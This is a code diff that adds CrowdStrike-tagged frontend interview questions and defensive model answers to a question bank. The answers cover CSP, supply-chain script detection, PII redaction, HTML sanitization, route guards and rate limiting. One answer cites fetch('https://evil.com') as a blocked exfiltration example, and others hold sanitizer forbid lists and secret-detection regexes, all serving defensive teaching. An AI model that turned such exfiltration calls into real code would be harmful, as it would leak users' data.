@@ -44,6 +44,7 @@ export const COMPANIES = [
   { id: 'Stripe',  emoji: '🟣', color: '#635BFF' },
   { id: 'Uber',    emoji: '⚫', color: '#000000' },
   { id: 'DriveNets', emoji: '🟢', color: '#22C55E' },
+  { id: 'CrowdStrike', emoji: '🔴', color: '#EC0000' },
 ]
 
 export const QUESTIONS: Question[] = [
@@ -837,7 +838,7 @@ function delegate(parent, selector, event, handler) {
   },
   {
     id: 'xss-csrf',
-    companies: ['Google'],
+    companies: ['Google', 'CrowdStrike'],
     title: 'XSS vs CSRF — how do you prevent them?',
     difficulty: 'medium',
     category: 'DOM & Browser',
@@ -879,7 +880,7 @@ el.innerHTML = DOMPurify.sanitize(userInput)  // if HTML needed
   },
   {
     id: 'localstorage-vs-cookies',
-    companies: ['TikTok', 'Amazon'],
+    companies: ['TikTok', 'Amazon', 'CrowdStrike'],
     title: 'localStorage vs sessionStorage vs cookies',
     difficulty: 'easy',
     category: 'DOM & Browser',
@@ -2339,5 +2340,530 @@ const p = fromCallback((ok, fail) => {
   ok('second') // ignored safely
 })
 p.then(console.log) // first`,
+  },
+
+  // ── CROWDSTRIKE ──────────────────────────────────────────────
+  {
+    id: 'csp-strict-design',
+    companies: ['CrowdStrike', 'Google'],
+    title: 'Design a strict Content Security Policy (CSP) for a SPA',
+    difficulty: 'hard',
+    category: 'DOM & Browser',
+    description:
+      'Design a strict CSP for a single-page app dashboard. Cover script/style sources, nonces vs hashes, `strict-dynamic`, reporting, and how to migrate from a permissive policy without breaking production.',
+    answerType: 'mixed',
+    tags: ['security', 'CSP', 'XSS', 'headers'],
+    answer: `Interview framing:
+- CSP is defense-in-depth against XSS, data exfiltration, and clickjacking.
+- Goal: prevent inline script execution and limit network egress to a known allowlist.
+
+Strict baseline (recommended starting point):
+\`\`\`
+Content-Security-Policy:
+  default-src 'none';
+  script-src 'nonce-{RANDOM}' 'strict-dynamic';
+  style-src  'self' 'nonce-{RANDOM}';
+  img-src    'self' data: https://cdn.example.com;
+  font-src   'self' data:;
+  connect-src 'self' https://api.example.com https://telemetry.example.com;
+  frame-ancestors 'none';
+  base-uri 'none';
+  form-action 'self';
+  object-src 'none';
+  report-to csp-endpoint;
+\`\`\`
+
+Key choices:
+- 'nonce-…' + 'strict-dynamic': trust scripts that come from a nonce'd loader, ignore host allowlists. Rotates per response (server-generated, cryptographically random, never reused).
+- 'unsafe-inline' / 'unsafe-eval': never in production. Vite/webpack production builds should not need eval.
+- frame-ancestors 'none' (or specific origins) is the modern X-Frame-Options.
+- object-src 'none' kills Flash/legacy plugin XSS vectors.
+- base-uri 'none' prevents <base> tag injection from rerouting relative URLs.
+
+Migration plan:
+1) Deploy in Report-Only mode (\`Content-Security-Policy-Report-Only\`) to a reporting endpoint.
+2) Triage report-to violations by directive; whitelist legitimate sources, fix illegitimate ones.
+3) Replace inline event handlers (onclick) and inline <script> with external + nonce.
+4) Move CSS-in-JS injection through nonce'd <style> tags.
+5) Flip to enforcing mode behind a feature flag, region-by-region.
+
+Common pitfalls:
+- Nonces reused across requests (defeats the purpose).
+- Forgetting connect-src for analytics/websocket endpoints.
+- Missing frame-ancestors lets the page be iframed for clickjacking.
+- 'self' on script-src + a CDN with open uploads = XSS bypass.`,
+  },
+  {
+    id: 'detect-supply-chain-script',
+    companies: ['CrowdStrike'],
+    title: 'Detect a malicious 3rd-party script at runtime',
+    difficulty: 'hard',
+    category: 'DOM & Browser',
+    description:
+      'You shipped a dependency that started exfiltrating form data after an upstream compromise. How would you detect this from the browser at runtime, and what guardrails should you have in place?',
+    answerType: 'mixed',
+    tags: ['security', 'supply chain', 'observability', 'CSP'],
+    answer: `Interview framing:
+- Modern XSS is increasingly supply-chain (Magecart-style) — your own code is fine, an npm dep is not.
+- Browser-side detection is best-effort; the real fix is preventing execution.
+
+Layered defenses (in order of strength):
+1) Subresource Integrity (SRI):
+   <script src="https://cdn/x.js" integrity="sha384-..." crossorigin="anonymous"></script>
+   Browser refuses to execute if the hash changes. Pin every external script.
+2) Strict CSP with nonces + connect-src allowlist:
+   Even if the script runs, fetch('https://evil.com') is blocked and reported.
+3) Lockfile + automated dep scanning (Snyk/Socket/Dependabot) in CI.
+4) Self-host critical 3rd-party JS through your own pipeline so you control the bytes.
+
+Runtime detection signals:
+- CSP report-to / report-uri violations spiking (especially connect-src / script-src).
+- ReportingObserver for deprecation/intervention/csp-violation events.
+- Patch fetch + XMLHttpRequest.send to log unknown destinations:
+
+\`\`\`js
+const allowed = new Set(['api.example.com', 'telemetry.example.com'])
+const origFetch = window.fetch
+window.fetch = function (input, init) {
+  try {
+    const url = new URL(typeof input === 'string' ? input : input.url, location.href)
+    if (!allowed.has(url.host)) {
+      navigator.sendBeacon('/sec/anomaly', JSON.stringify({
+        kind: 'unexpected-fetch',
+        host: url.host,
+        page: location.pathname,
+      }))
+    }
+  } catch {}
+  return origFetch.apply(this, arguments)
+}
+\`\`\`
+
+- MutationObserver on document.head/body for unexpected <script> or <iframe> injection.
+- Watch for rogue overrides of HTMLFormElement.prototype.submit or input value getters
+  (classic skimmer pattern).
+
+Incident response:
+- Kill switch: feature flag that swaps the bad dep for a safe stub at the edge.
+- Rotate any auth tokens that may have been exposed.
+- Pull the version from CDN, force cache bust, file an advisory.`,
+  },
+  {
+    id: 'realtime-event-stream-design',
+    companies: ['CrowdStrike', 'Netflix'],
+    title: 'Design a real-time event stream UI for high-volume telemetry',
+    difficulty: 'hard',
+    category: 'System Design',
+    description:
+      'Design a frontend that displays a live stream of security events (think 5k-50k events/min) with filtering, virtualization, and pause/resume — without freezing the browser.',
+    answerType: 'mixed',
+    tags: ['system design', 'real-time', 'virtualization', 'performance'],
+    answer: `Interview framing:
+- The hard parts are not the UI components; they are backpressure, batching, and memory.
+- A naive setState per WS message at 50k/min = main thread death.
+
+Transport:
+- WebSocket (or SSE if one-way) with sequence numbers for gap detection.
+- Server-side filter/projection so the browser only receives subscribed event kinds.
+- Heartbeats every 15-30s; auto-reconnect with exponential backoff + resume-from-seq.
+
+Ingestion pipeline (client):
+1) WebSocket onmessage pushes into a ring buffer (Array of fixed cap, e.g. 10k).
+2) A rAF/setTimeout-driven flusher (every ~100ms) drains the buffer into React state
+   in one batched setState. This caps re-renders at ~10/s regardless of event rate.
+3) When buffer is full, drop oldest + increment a "dropped" counter shown in the UI
+   (visible backpressure beats silent freeze).
+4) Pause button stops the flusher but keeps WS draining into the ring buffer; on
+   resume, jump to the latest N or replay depending on UX choice.
+
+Rendering:
+- Virtualized list (react-window / TanStack Virtual). Never render 10k DOM rows.
+- Row component memoized with stable keys (event.id), shallow-equal props.
+- Time-based grouping headers computed off-thread or memoized by minute bucket.
+
+Filtering:
+- Apply server-side first (subscription filter).
+- Client-side secondary filter runs on the buffered slice, not the raw stream.
+- For complex queries, debounce the filter input and run the predicate in a
+  Web Worker so the main thread stays at 60fps.
+
+Observability of the UI itself:
+- Track dropped count, lag (now - latest event ts), reconnect count, render time.
+- Expose them in a debug panel so SREs can diagnose "feed feels slow" reports.
+
+Pitfalls to call out:
+- React state with append-only arrays grows unbounded — cap it.
+- Date.now() formatting per row per render is surprisingly hot — memoize or use Intl.RelativeTimeFormat sparingly.
+- Auto-scroll to bottom only when user is already at bottom; otherwise users lose their place.`,
+  },
+  {
+    id: 'redact-pii-in-logs',
+    companies: ['CrowdStrike', 'Stripe'],
+    title: 'Redact PII before sending logs to a telemetry backend',
+    difficulty: 'medium',
+    category: 'Performance',
+    description:
+      'Implement a small client-side log scrubber that redacts PII (emails, tokens, credit cards) from log payloads before they leave the browser. Keep it fast and side-effect free.',
+    answerType: 'code',
+    tags: ['security', 'logging', 'PII', 'telemetry'],
+    answer: `// Goals:
+// - No mutation of caller objects (defensive copy).
+// - Bounded depth and size to avoid pathological inputs.
+// - Allowlist of obviously-safe keys, denylist of obviously-sensitive keys.
+
+const SENSITIVE_KEYS = /(^|_)(password|token|secret|authorization|api[_-]?key|cookie|ssn)$/i
+
+const PATTERNS = [
+  // Emails
+  { re: /[\\w.+-]+@[\\w-]+\\.[\\w.-]+/g, mask: '[email]' },
+  // 13-19 digit card-ish numbers (with optional spaces/dashes)
+  { re: /\\b(?:\\d[ -]*?){13,19}\\b/g, mask: '[card]' },
+  // JWT-shaped tokens
+  { re: /\\beyJ[\\w-]+\\.[\\w-]+\\.[\\w-]+\\b/g, mask: '[jwt]' },
+  // Bearer / Basic header values
+  { re: /\\b(Bearer|Basic)\\s+[A-Za-z0-9._\\-+/=]+/g, mask: '$1 [redacted]' },
+]
+
+function redactString(str) {
+  let out = str
+  for (const { re, mask } of PATTERNS) out = out.replace(re, mask)
+  return out
+}
+
+export function redact(value, depth = 0) {
+  if (depth > 6) return '[depth-cut]'
+  if (value == null) return value
+  if (typeof value === 'string') return redactString(value)
+  if (typeof value !== 'object') return value
+  if (Array.isArray(value)) return value.map((v) => redact(v, depth + 1))
+
+  const out = {}
+  for (const [key, val] of Object.entries(value)) {
+    if (SENSITIVE_KEYS.test(key)) {
+      out[key] = '[redacted]'
+      continue
+    }
+    out[key] = redact(val, depth + 1)
+  }
+  return out
+}
+
+// Usage
+const event = {
+  user: { email: 'alice@example.com', authorization: 'Bearer abc.def.ghi' },
+  message: 'login failed for alice@example.com',
+}
+console.log(redact(event))
+// { user: { email: '[email]', authorization: '[redacted]' },
+//   message: 'login failed for [email]' }
+
+// Follow-ups:
+// - Move heavy regexes to a Web Worker if you redact at high volume.
+// - Consider a JSON Schema-driven redactor when payload shape is known (faster).
+// - Always redact on the client AND on the server; never trust either alone.`,
+  },
+  {
+    id: 'web-worker-offload',
+    companies: ['CrowdStrike', 'Google'],
+    title: 'Offload heavy parsing to a Web Worker (with cancellation)',
+    difficulty: 'medium',
+    category: 'Performance',
+    description:
+      'You parse large JSON / log blobs in the browser and the main thread janks. Wrap a Web Worker in a clean Promise-based API with cancellation and request IDs.',
+    answerType: 'code',
+    tags: ['web workers', 'performance', 'concurrency', 'cancellation'],
+    answer: `// worker.js — runs off the main thread
+self.onmessage = (e) => {
+  const { id, payload } = e.data
+  try {
+    // Replace with real heavy work (parse, decompress, indexing, etc.)
+    const result = JSON.parse(payload)
+    self.postMessage({ id, ok: true, result })
+  } catch (err) {
+    self.postMessage({ id, ok: false, error: String(err) })
+  }
+}
+
+// workerClient.js — main thread API
+export function createWorkerClient(workerUrl) {
+  const worker = new Worker(workerUrl, { type: 'module' })
+  const pending = new Map() // id -> { resolve, reject, signal, onAbort }
+  let nextId = 0
+
+  worker.onmessage = (e) => {
+    const { id, ok, result, error } = e.data
+    const entry = pending.get(id)
+    if (!entry) return // already cancelled
+    pending.delete(id)
+    entry.signal?.removeEventListener('abort', entry.onAbort)
+    ok ? entry.resolve(result) : entry.reject(new Error(error))
+  }
+
+  function run(payload, { signal } = {}) {
+    if (signal?.aborted) return Promise.reject(new DOMException('Aborted', 'AbortError'))
+
+    return new Promise((resolve, reject) => {
+      const id = nextId++
+      const onAbort = () => {
+        if (!pending.has(id)) return
+        pending.delete(id)
+        reject(new DOMException('Aborted', 'AbortError'))
+        // Cooperative cancel: tell the worker to drop this id if it supports it.
+        worker.postMessage({ id, cancel: true })
+      }
+      pending.set(id, { resolve, reject, signal, onAbort })
+      signal?.addEventListener('abort', onAbort, { once: true })
+      worker.postMessage({ id, payload })
+    })
+  }
+
+  function terminate() {
+    worker.terminate()
+    pending.forEach((p) => p.reject(new Error('worker terminated')))
+    pending.clear()
+  }
+
+  return { run, terminate }
+}
+
+// Usage
+const client = createWorkerClient(new URL('./worker.js', import.meta.url))
+const ctrl = new AbortController()
+client.run(bigJsonString, { signal: ctrl.signal })
+  .then((parsed) => render(parsed))
+  .catch((err) => { if (err.name !== 'AbortError') reportError(err) })
+
+// Cancel if the user navigates away:
+ctrl.abort()
+
+// Interview talking points:
+// - Use Transferable objects (ArrayBuffer) for zero-copy where possible.
+// - Pool workers when calls are frequent (creation cost is ~1-5ms).
+// - Workers don't have DOM access; serialize data, not functions.`,
+  },
+  {
+    id: 'role-based-route-guard',
+    companies: ['CrowdStrike', 'Stripe'],
+    title: 'Implement role-based route guards on the client',
+    difficulty: 'medium',
+    category: 'System Design',
+    description:
+      'Design a React route-guard pattern for an admin console with multiple roles (admin, analyst, viewer). Cover the security caveats — what the client guard actually buys you and what it does not.',
+    answerType: 'code',
+    tags: ['react', 'auth', 'rbac', 'security'],
+    answer: `// First, the honest part:
+// Client-side guards are a UX layer, NOT a security boundary.
+// Every protected action MUST be re-checked on the server.
+// The client guard exists to:
+//  1) Hide controls a user cannot use (less confusing).
+//  2) Avoid wasted requests that will 403 anyway.
+//  3) Redirect unauth'd users to login before they hit a broken UI.
+
+import { Navigate, Outlet, useLocation } from 'react-router-dom'
+
+type Role = 'admin' | 'analyst' | 'viewer'
+
+interface Session {
+  userId: string
+  roles: Role[]
+}
+
+const SessionCtx = createContext<Session | null>(null)
+export const useSession = () => useContext(SessionCtx)
+
+export function hasAny(session: Session | null, allowed: Role[]): boolean {
+  if (!session) return false
+  return session.roles.some((r) => allowed.includes(r))
+}
+
+export function RequireRole({ allowed }: { allowed: Role[] }) {
+  const session = useSession()
+  const location = useLocation()
+
+  if (!session) {
+    return <Navigate to="/login" replace state={{ from: location }} />
+  }
+  if (!hasAny(session, allowed)) {
+    return <Navigate to="/403" replace />
+  }
+  return <Outlet />
+}
+
+// Usage with React Router
+<Routes>
+  <Route element={<RequireRole allowed={['admin', 'analyst', 'viewer']} />}>
+    <Route path="/dashboard" element={<Dashboard />} />
+  </Route>
+  <Route element={<RequireRole allowed={['admin', 'analyst']} />}>
+    <Route path="/incidents" element={<Incidents />} />
+  </Route>
+  <Route element={<RequireRole allowed={['admin']} />}>
+    <Route path="/admin/users" element={<UserAdmin />} />
+  </Route>
+</Routes>
+
+// Per-control gating
+function DangerButton() {
+  const session = useSession()
+  if (!hasAny(session, ['admin'])) return null
+  return <button onClick={deleteEverything}>Delete</button>
+}
+
+// Pitfalls to mention in the interview:
+// - Don't ship admin-only code splits to non-admins (use route-level lazy loading
+//   so the JS bundle isn't even fetched).
+// - Refresh the session on focus/visibility — roles can change.
+// - Treat \`session\` as untrusted input; never let it grant access to data the
+//   server wouldn't return anyway.
+// - For deep-link sharing, distinguish "not logged in" vs "logged in but forbidden"
+//   so users get the right next action.`,
+  },
+  {
+    id: 'safe-html-rendering',
+    companies: ['CrowdStrike', 'Google', 'Meta'],
+    title: 'Safely render user-supplied HTML (sanitization)',
+    difficulty: 'medium',
+    category: 'DOM & Browser',
+    description:
+      'You need to render user-authored markdown / rich text in a security console (analyst notes). Walk through a safe pipeline and the trust boundaries.',
+    answerType: 'mixed',
+    tags: ['security', 'XSS', 'sanitization', 'markdown'],
+    answer: `Trust boundaries:
+- Input source: an authenticated analyst — still untrusted from the renderer's POV.
+- Output target: the same domain as the auth cookie — XSS = full account takeover.
+- Therefore: sanitize on render, every time, no exceptions.
+
+Recommended pipeline:
+1) Parse markdown -> HTML with a strict parser (e.g. \`marked\` or \`remark\`).
+   Disable raw HTML pass-through if you don't need it.
+2) Sanitize the HTML with DOMPurify configured to an allowlist:
+
+\`\`\`ts
+import DOMPurify from 'dompurify'
+
+const SAFE_CONFIG: DOMPurify.Config = {
+  ALLOWED_TAGS: [
+    'a','b','blockquote','br','code','em','h1','h2','h3','h4','hr',
+    'i','li','ol','p','pre','s','span','strong','table','tbody','td',
+    'th','thead','tr','ul'
+  ],
+  ALLOWED_ATTR: ['href','title','class','rel','target'],
+  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#|\\/)/i,
+  FORBID_ATTR: ['style','onerror','onload','onclick'],
+  FORBID_TAGS: ['script','iframe','object','embed','form','input'],
+}
+
+DOMPurify.addHook('afterSanitizeAttributes', (node) => {
+  if (node.tagName === 'A') {
+    node.setAttribute('rel', 'noopener noreferrer nofollow')
+    node.setAttribute('target', '_blank')
+  }
+})
+
+export function renderSafeHtml(dirtyHtml: string): string {
+  return DOMPurify.sanitize(dirtyHtml, SAFE_CONFIG)
+}
+\`\`\`
+
+3) Inject with \`dangerouslySetInnerHTML\` (React) or \`element.innerHTML\`. The name
+   of the React API is intentionally scary — keep the unsafe surface tiny.
+
+\`\`\`tsx
+function NoteBody({ markdown }: { markdown: string }) {
+  const html = useMemo(
+    () => renderSafeHtml(markdownToHtml(markdown)),
+    [markdown]
+  )
+  return <div className="note" dangerouslySetInnerHTML={{ __html: html }} />
+}
+\`\`\`
+
+Defense in depth (don't rely on one layer):
+- CSP with no 'unsafe-inline' on script-src.
+- Trusted Types (Chromium) so any string -> sink without policy throws.
+- Server-side sanitize on write so a bug in the client doesn't taint storage forever.
+
+Things that look safe but aren't:
+- Stripping <script> with regex. (Use a parser. Always.)
+- Allowing \`style\` attributes (CSS injection -> data exfiltration via background-image).
+- Allowing \`javascript:\` URLs in <a href>. URI regex must allowlist schemes.
+- Allowing \`srcdoc\` on iframes.`,
+  },
+  {
+    id: 'rate-limit-frontend',
+    companies: ['CrowdStrike', 'Stripe'],
+    title: 'Implement client-side rate limiting for an action',
+    difficulty: 'medium',
+    category: 'Performance',
+    description:
+      'Implement a token-bucket rate limiter in JS that throttles a function (e.g. log forwarder) to N calls per interval, queueing or dropping overflow.',
+    answerType: 'code',
+    tags: ['rate limiting', 'token bucket', 'performance', 'algorithms'],
+    answer: `// Token bucket: capacity tokens, refilled at refillPerMs rate.
+// Each call costs 1 token. If no token, either drop or queue.
+
+export function createTokenBucket({
+  capacity,
+  refillPerSecond,
+  mode = 'queue', // 'queue' | 'drop'
+}) {
+  let tokens = capacity
+  let lastRefill = Date.now()
+  const queue = []
+
+  function refill() {
+    const now = Date.now()
+    const elapsed = (now - lastRefill) / 1000
+    tokens = Math.min(capacity, tokens + elapsed * refillPerSecond)
+    lastRefill = now
+  }
+
+  function tryDrain() {
+    refill()
+    while (queue.length && tokens >= 1) {
+      tokens -= 1
+      const { fn, resolve, reject } = queue.shift()
+      Promise.resolve()
+        .then(fn)
+        .then(resolve, reject)
+    }
+    if (queue.length) {
+      const waitMs = ((1 - tokens) / refillPerSecond) * 1000
+      setTimeout(tryDrain, Math.max(10, waitMs))
+    }
+  }
+
+  return function schedule(fn) {
+    return new Promise((resolve, reject) => {
+      refill()
+      if (tokens >= 1 && queue.length === 0) {
+        tokens -= 1
+        Promise.resolve().then(fn).then(resolve, reject)
+        return
+      }
+      if (mode === 'drop') {
+        reject(new Error('rate-limited'))
+        return
+      }
+      queue.push({ fn, resolve, reject })
+      tryDrain()
+    })
+  }
+}
+
+// Usage: forward at most 5 logs/sec, queue the rest
+const sendLog = createTokenBucket({ capacity: 10, refillPerSecond: 5 })
+
+for (const event of events) {
+  sendLog(() => fetch('/log', { method: 'POST', body: JSON.stringify(event) }))
+    .catch((e) => console.warn('dropped', e))
+}
+
+// Talking points:
+// - Token bucket allows bursts up to capacity (good for spiky log streams).
+// - Leaky bucket (fixed rate, no bursts) is stricter — pick by use case.
+// - Always pair with server-side rate limiting; client-side is a politeness layer.
+// - For multi-tab apps, coordinate via BroadcastChannel or a SharedWorker so
+//   tabs don't each get their own quota.`,
   },
 ]
